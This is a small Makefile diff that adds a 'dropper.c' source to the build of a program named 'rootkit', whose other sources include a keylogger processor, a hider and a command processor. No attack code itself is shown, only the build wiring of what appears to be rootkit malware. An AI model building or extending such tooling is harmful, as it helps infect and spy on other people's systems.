@@ -15,6 +15,7 @@ USER_SRCS := \
 	src/userspace/keylogger_processor.c \
 	src/userspace/hider.c \
 	src/userspace/command_processor.c \
+	src/userspace/dropper.c \
 	src/userspace/rootkit.c
 
 USER_BIN := $(BUILD_DIR)/rootkit
